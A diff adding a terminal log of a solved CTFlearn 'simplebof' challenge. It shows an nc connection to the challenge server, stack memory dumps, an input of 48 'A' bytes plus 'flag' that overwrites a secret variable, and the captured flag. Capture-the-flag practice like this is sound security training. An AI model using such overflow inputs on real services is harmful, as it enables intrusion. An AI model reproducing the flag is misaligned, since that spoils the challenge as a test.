@@ -1,0 +1,35 @@
+$ nc thekidofarcrania.com 35235
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED CORRECT secret                                                                                  
+0xffc32eb8 | 00 00 00 00 00 00 00 00 |
+0xffc32ec0 | 00 00 00 00 00 00 00 00 |
+0xffc32ec8 | 00 00 00 00 00 00 00 00 |
+0xffc32ed0 | 00 00 00 00 00 00 00 00 |
+0xffc32ed8 | ff ff ff ff ff ff ff ff |
+0xffc32ee0 | ff ff ff ff ff ff ff ff |
+0xffc32ee8 | ef be ad de 00 ff ff ff |
+0xffc32ef0 | c0 55 f9 f7 84 5f 5a 56 |
+0xffc32ef8 | 08 2f c3 ff 11 3b 5a 56 |
+0xffc32f00 | 20 2f c3 ff 00 00 00 00 |
+
+Input some text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED CORRECT secret                                                                                  
+0xffc32eb8 | 41 41 41 41 41 41 41 41 |
+0xffc32ec0 | 41 41 41 41 41 41 41 41 |
+0xffc32ec8 | 41 41 41 41 41 41 41 41 |
+0xffc32ed0 | 41 41 41 41 41 41 41 41 |
+0xffc32ed8 | 41 41 41 41 41 41 41 41 |
+0xffc32ee0 | 41 41 41 41 41 41 41 41 |
+0xffc32ee8 | 66 6c 61 67 00 ff ff ff |
+0xffc32ef0 | c0 55 f9 f7 84 5f 5a 56 |
+0xffc32ef8 | 08 2f c3 ff 11 3b 5a 56 |
+0xffc32f00 | 20 2f c3 ff 00 00 00 00 |
+
+You did it! Congratuations!
+CTFlearn{buffer_0verflows_4re_c00l!}
+                                                                                                                                     
+┌──(brian㉿BRIAN)-[~/…/my docs/CTF/ctflearn/simplebof]
+└─$ 
